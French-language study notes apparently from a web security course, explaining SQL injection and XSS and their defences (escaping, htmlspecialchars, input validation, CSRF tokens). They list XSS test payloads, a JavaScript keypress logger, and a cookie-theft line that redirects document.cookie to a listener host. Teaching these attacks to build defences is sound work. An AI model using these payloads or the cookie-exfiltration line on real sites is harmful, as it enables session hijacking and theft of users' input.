# Rappel

# Injection SQL

- lorsque l'on écrit du SQL dans un formulaire 
- si le formulaire est en GET => passer par la barre d'adresse

Comprendre l'attaque 

- lorsque vous mettez le symbole apostrophe 
- et que la réponse du site internet est bizarre
- par exemple erreur 500 => l'apostrophe a le sens de finir un texte dans la requête SQL 

## pour se protéger :

1. échappement des données reçues => devant l'apostrophe il va mettre un symbole \ => \' => ça veut dire que l'apostrophe n'est qu'une apostrophe (et non le délimiteur de fin d'une string)

2. vérifier que les données saisies sont conformes 

3. champ masqué CSRF

4. il force la conversion dans ce qu'il veut 


# Injection XSS

- lorsque l'on écrit du javascript dans un formulaire
- si le formulaire est en GET => passer par la barre d'adresse

1. écrire `<script>alert('coucou')</script>`
    1. <img src="xxx" onerror="alert('salut')">
    1. <body onload="alert('salut')"></body>
1. ce code va être ajouter dans le html de la page 

## variante de cette attaque 

- keylogger (écouter ce que l'utilisateur saisit)

```js
window.addEventListener("keypress" , function(e){
    console.log(e.key)
})
```
- vol de cookie de SESSION 

```js
document.location='http://localhost:1234?g='+document.cookie 
```

## Session 2 choses :

1. côté navigateur :

dans les entêtes http 

2. côté serveur 

dans le dossier /tmp


## Comment faire pour se protéger des attaques XSS 

échappement pour le XSS

transformer les caractères spéciaux du html < > " "

```
en   < &lt;
en   > &gt;
en   = &#61;
```

utilisation de la fonction `htmlspecialchars( $_GET[ 'name' ] );` <https://www.php.net/manual/fr/function.htmlspecialchars.php>


```
&lt;script&gt;alert('coucou')&lt;/script&gt;
```

2. vérifier que les données saisies sont conformes 

3. token CSRF